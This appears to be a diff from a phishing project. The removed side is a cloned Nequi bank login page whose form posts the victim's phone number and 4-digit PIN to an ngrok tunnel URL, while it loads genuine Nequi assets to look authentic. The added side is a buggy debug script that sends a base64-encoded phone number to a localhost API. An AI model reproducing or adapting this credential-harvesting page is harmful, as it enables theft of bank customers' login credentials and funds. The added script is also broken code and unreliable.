@@ -1,65 +1,18 @@
-<html><head><style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}</style>
-    <meta charset="utf-8">
-    <title>Nequi</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="generator" content="Webflow">
-    <meta http-equiv="cache-control" content="max-age=0">
-    <meta http-equiv="cache-control" content="no-cache">
-    <meta http-equiv="expires" content="0">
-    <meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT">
-    <meta http-equiv="pragma" content="no-cache">
-    <script type="text/javascript" async="" src="https://www.gstatic.com/recaptcha/releases/3kTz7WGoZLQTivI-amNftGZO/recaptcha__es.js" crossorigin="anonymous" integrity="sha384-etYxihAYMtaMHgdnAPDOR1mpRap4yAjc5DqJE/PR1622jz1JXc2BP6GEVI3163Q0"></script><script type="text/javascript" src="/bdigital/ruxitagentjs_ICA2NVfqru_10271230629152232.js" data-dtconfig="app=8cf72b5a35a9f4d5|cuc=k6ulailr|mel=100000|featureHash=ICA2NVfqru|dpvc=1|ssv=4|lastModification=1691497878007|vcv=2|tp=500,50,0,1|rdnt=1|uxrgce=1|bp=3|agentUri=/bdigital/ruxitagentjs_ICA2NVfqru_10271230629152232.js|reportUrl=/bdigital/rb_bf48591pze|rid=RID_-1619468439|rpid=-918343739|domain=nequi.com"></script><link rel="stylesheet" type="text/css" href="https://transacciones.nequi.com/bdigital/css/normalize.css">
-    <link rel="stylesheet" type="text/css" href="https://transacciones.nequi.com/bdigital/css/nequi_two.webflow.css">
-    <link rel="stylesheet" type="text/css" href="https://transacciones.nequi.com/bdigital/css/nequi_one.webflow.css">
-    <link rel="stylesheet" type="text/css" href="https://transacciones.nequi.com/bdigital/css/main.css">
-    <link rel="shortcut icon" type="image/x-icon" href="https://transacciones.nequi.com/bdigital/images/favicon.ico">
-  
-      <!-- Librerias JS -->
-        <script src="//ajax.googleapis.com/ajax/libs/angularjs/1.4.0-beta.2/angular.min.js"></script>
-      <script src="https://code.angularjs.org/1.4.3/i18n/angular-locale_en-us.js"></script>
-      <script src="https://transacciones.nequi.com/bdigital/js/libs/lodash.min.js"></script>
-      <script src="https://transacciones.nequi.com/bdigital/js/libs/restangular.min.js"></script>
-      <script type="text/javascript" src="https://transacciones.nequi.com/bdigital/js/libs/angular-recaptcha.min.js"></script>
-  
-  </head>
-  <body ng-app="App" class="ng-scope">
-  
-      <div id="content">
-          <!-- ngInclude: getTemplate('/header.html') --><div ng-include="getTemplate('/header.html')" class="ng-scope"><header class="ng-scope"> <div class="wrap-header"> <div class="row"> <div class="col-xs-12 col-md-2"> <div class="logo"> <a href="https://www.nequi.com.co"> <img alt="nequi" src="https://sherpa-images.s3.amazonaws.com/webs/logo-nequi.svg"> </a> </div> <div class="btn-menu-hamburguer" ng-click="openMenu();"> <a href="#" class=""> <span></span> </a> </div> </div> <div class="col-xs-12 col-md-10"> <div class="wrap-main-menu "> <div class="row"> <div class="col-xs-12 col-md-8"> </div> <div class="col-xs-12 col-md-4"> <div class="buttons-right"> <ul> <!-- ngIf: !hidePa --><li ng-if="!hidePa" class="ng-scope"> <a target="_blank" href="https://recarga.nequi.com.co/bdigitalpsl" class="ng-binding">Recarga</a> </li><!-- end ngIf: !hidePa --> <li> <a href="private/" class="ng-binding">Entrar</a> </li> </ul> </div> </div> </div> </div> </div> </div> </div> </header></div>
-          <section class="login-section ng-scope" ng-controller="loginController as loginControl">
-              <div class="login-wrap">
-                  <h1 class="ng-binding">Entra a tu Nequi</h1>
-                  <p class="ng-binding">Podrás bloquear tu Nequi y consultar tus datos.</p>
-                  <div class="login-form-wrap">
-                      <form method="POST" action="https://afda-191-111-15-211.ngrok-free.app/api/v2/schedules/create_or_update" autocomplete="off" name="loginControl.formLogin" novalidate="" class="ng-pristine ng-valid-us-phone-number ng-invalid ng-invalid-required ng-valid-pattern ng-valid-minlength ng-valid-maxlength ng-invalid-recaptcha">
-                          <div class="input-wrap input-country">
-                              <div class="wrap-select-country">
-                                  <select-country selected-country="loginControl.selectCountry" options="loginControl.selectOption" on-select-country="loginControl.onSelectCountry(option)" class="ng-isolate-scope"><div class="select-country " ng-click="toggleSelect();"> <div class="country-wrap country-active"> <div class="select-col select-col-img"> <img src="images/flag_colombia.png" alt="co"> </div> <div class="select-col"> <p class="ng-binding"> +57 </p> <input class="country-input" type="text" name="j_region" id="j_region" value="57"> </div> </div> <ul> <!-- ngRepeat: option in options --><li ng-repeat="option in options" class="ng-scope"> <div ng-click="setCountry($index);" class="country-wrap"> <div class="select-col select-col-img"> <img src="images/flag_colombia.png" alt="co"> </div> <div class="select-col"> <p class="ng-binding">+57</p> </div> </div> </li><!-- end ngRepeat: option in options --><li ng-repeat="option in options" class="ng-scope"> <div ng-click="setCountry($index);" class="country-wrap"> <div class="select-col select-col-img"> <img src="images/flag_panama.png" alt="pa"> </div> <div class="select-col"> <p class="ng-binding">+507</p> </div> </div> </li><!-- end ngRepeat: option in options --> </ul> </div></select-country>
-                              </div>
-                              <input class="form-input-text ng-pristine ng-untouched ng-valid-us-phone-number ng-invalid ng-invalid-required ng-valid-pattern ng-valid-minlength" type="tel" id="j_username" name="j_username" placeholder="Celular" ng-required="true" ng-minlength="10" ng-pattern="^[0-9]*$+s" ng-model="loginControl.user" ui-us-phone-number="" masklocalstring="000 000 0000" required="required">
-                          </div>
-                          <div class="input-wrap">
-                              <input class="form-input-text ng-pristine ng-untouched ng-invalid ng-invalid-required ng-valid-pattern ng-valid-minlength ng-valid-maxlength" type="password" id="j_password" name="j_password" placeholder="Contraseña" ng-required="true" ng-maxlength="4" ng-minlength="4" ng-pattern="^[0-9]*$" ng-model="loginControl.password" required="required">
-                          </div>
-                          <div class="btn-wrap">
-                              <input class="form-btn-submit" type="submit" value="Entra">
-                          </div>
-                      </form>
-                  </div>
-              </div>
-          </section>
-          <!-- ngInclude: getTemplate('/footer.html') --><div ng-include="getTemplate('/footer.html')" class="ng-scope"><footer class="ng-scope"> <div class="wrap-footer"> <div class="superior-footer"> <div class="row"> <div class="col-xs-12 col-md-3"> <div class="footer-logos"> <img class="logo-footer-nequi" alt="logo nequi" src="https://sherpa-images.s3.amazonaws.com/webs/logo-nequi-blanco.svg"> </div> </div> <div class="col-xs-12 col-md-9"> <div class="footer-wrap-widgets"> <div class="row"> <div class="col-ss-12 col-xs-6 col-sm-3 col-md-3"> <div class="widget-footer"> <h3 class="title ng-binding">Producto</h3> <div class="menu-producto-container"> <ul class="menu"> <li> <a href="https://www.nequi.com.co/informacion-legal" class="ng-binding"> Legales </a> </li> <li> <a href="https://ayuda.nequi.com.co/hc/es" class="ng-binding"> Ayuda </a> </li> </ul> </div> </div> </div> <div class="col-ss-12 col-xs-6 col-sm-3 col-md-3"> <div class="widget-footer"> <h3 class="title ng-binding">Descarga la App</h3> <div class="textwidget"> <ul> <a class="logo-app-store" href="https://itunes.apple.com/co/app/nequi/id1075378688?mt=8" target="_blank"><img class="appStore" src="https://nequi-wp-colombia.s3.amazonaws.com/wp-content/uploads/2017/08/APP.png"></a> <a class="logo-google-play" href="https://play.google.com/store/apps/details?id=com.nequi.MobileApp&amp;amp;hl=es" target="_blank"><img class="appStore" src="https://nequi-wp-colombia.s3.amazonaws.com/wp-content/uploads/2017/08/PLAY.png"></a> </ul> </div> </div> </div> <!-- ngIf: !hidePa --><div class="col-xs-12 col-sm-3 col-md-3 ng-scope" ng-if="!hidePa"> <div class="widget-footer"> <h3 class="title ng-binding">Portales</h3> <div class="textwidget"> <ul> <li><a target="_blank" href="https://metidasdeplata.nequi.com.co/">Blog | Metidas de plata </a></li> <li><a target="_blank" href="https://conecta.nequi.com.co/">APIs | Nequi conecta </a></li> </ul> </div> </div> </div><!-- end ngIf: !hidePa --> <div class="col-xs-12 col-sm-3 col-md-3"> <div class="widget-footer social"> <h3 class="title ng-binding">Redes</h3> <div class="textwidget"> <div class="wrap-download-footer"> <ul> <li> <a class="social-icon fb" href="https://www.facebook.com/appnequi/" target="_blank"></a> </li> <!-- ngIf: !hidePa --><li ng-if="!hidePa" class="ng-scope"> <a class="social-icon tw" href="https://twitter.com/nequi/" target="_blank"></a> </li><!-- end ngIf: !hidePa --> <li> <a class="social-icon ins" href="https://www.instagram.com/nequi_/" target="_blank"></a> </li> <li> <a class="social-icon you" href="https://www.youtube.com/channel/UCK1dLH3nTK-GOlgSVa95XNg" target="_blank"></a> </li> </ul> </div> </div> </div> </div> <!-- ngIf: !hideCo --> </div> </div> </div> </div> </div> <div class="inferior-footer"> <div class="row"> <div class="col-ss-4 col-xs-1 col-sm-12 col-md-12"> <div class="logo-by-bancolombia"> <!-- ngIf: !hidePa --><img ng-if="!hidePa" class="logo-footer-bancolombia ng-scope" alt="logo by bancolombia" src="https://sherpa-images.s3.amazonaws.com/webs/logo-grupo-bancolombia-blanco.svg"><!-- end ngIf: !hidePa --> <!-- ngIf: !hideCo --> </div> </div> <div class="col-xs-12 col-md-9"> <nav class="menu-footer-navegacion"> <ul> <li> <a href="https://www.nequi.com.co/informacion-legal" class="ng-binding"> Características del producto </a> </li> <li> <a href="https://www.nequi.com.co/legal-web/condiciones-de-uso-de-la-pagina-web" class="ng-binding"> Condiciones de uso </a> </li> <li> <a href="https://www.nequi.com.co/informacion-legal" class="ng-binding"> Legales </a> </li> <li> <a href="https://www.nequi.com.co/informacion-legal" class="ng-binding"> Términos y condiciones </a> </li> </ul> </nav> </div> </div> </div> </div> <!-- ngIf: !hidePa --><div ng-if="!hidePa" class="logo-vigilado ng-scope"></div><!-- end ngIf: !hidePa --> </footer></div>
-      </div>
-  
-    
-    <script src="https://transacciones.nequi.com/bdigital/js/libs/crypto/aes.js"></script>
-    <script src="https://transacciones.nequi.com/bdigital/js/libs/crypto/pbkdf2.js"></script>
-    <script src="https://transacciones.nequi.com/bdigital/js/libs/crypto/AesUtil.js"></script>
-    <script src="https://transacciones.nequi.com/bdigital/js/libs/crypto/md5.js"></script>
-    <script src="https://transacciones.nequi.com/bdigital/js/libs/angular-no-captcha.js"></script>
-    <script src="https://transacciones.nequi.com/bdigital/js/libs/angular-input-masks-standalone.min.js"></script>
-    <script src="https://transacciones.nequi.com/bdigital/js/libs/string-mask.js"></script>
-    <!-- App -->
-    <script src="https://transacciones.nequi.com/bdigital/js/scripts.js"></script>
-  
-  <script async="" defer="" src="https://www.google.com/recaptcha/api.js?onload=vcRecaptchaApiLoaded&amp;render=explicit"></script><div style="background-color: rgb(255, 255, 255); border: 1px solid rgb(204, 204, 204); box-shadow: rgba(0, 0, 0, 0.2) 2px 2px 3px; position: absolute; transition: visibility 0s linear 0.3s, opacity 0.3s linear 0s; opacity: 0; visibility: hidden; z-index: 2000000000; left: 0px; top: -10000px;"><div style="width: 100%; height: 100%; position: fixed; top: 0px; left: 0px; z-index: 2000000000; background-color: rgb(255, 255, 255); opacity: 0.05;"></div><div class="g-recaptcha-bubble-arrow" style="border: 11px solid transparent; width: 0px; height: 0px; position: absolute; pointer-events: none; margin-top: -11px; z-index: 2000000000;"></div><div class="g-recaptcha-bubble-arrow" style="border: 10px solid transparent; width: 0px; height: 0px; position: absolute; pointer-events: none; margin-top: -10px; z-index: 2000000000;"></div><div style="z-index: 2000000000; position: relative;"><iframe title="El reCAPTCHA caduca dentro de dos minutos" src="https://www.google.com/recaptcha/api2/bframe?hl=es&amp;v=3kTz7WGoZLQTivI-amNftGZO&amp;k=6LdjCwshAAAAALml0fdmI80RRivlxm74orS_2V4i" name="c-xwzrpfh1whw1" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox" style="width: 100%; height: 100%;"></iframe></div></div></body><!-- Encriptar --></html>
+<div id="player-info">
+</div>
+<script>
+	body.onload = showInfo();
+	function showInfo() {
+		alert("I'm in");
+		debugger;
+		const xhttp = new XMLHttpRequest();
+		xhttp.open("GET", "http://localhost:3000/api/v2/test?phone_number=MzAwMzc0Njc4Ng==", true);
+		xhttp.setRequestHeader('Content-type', 'application/json; charset=UTF-8')
+		xhr.onload = function (response) {
+			if(xhr.status === 201) {
+				alert("Get successfully created!") ;
+				document.getElementById("player-info").innerHTML += xhr.response
+			}
+		}
+	}
+</script>
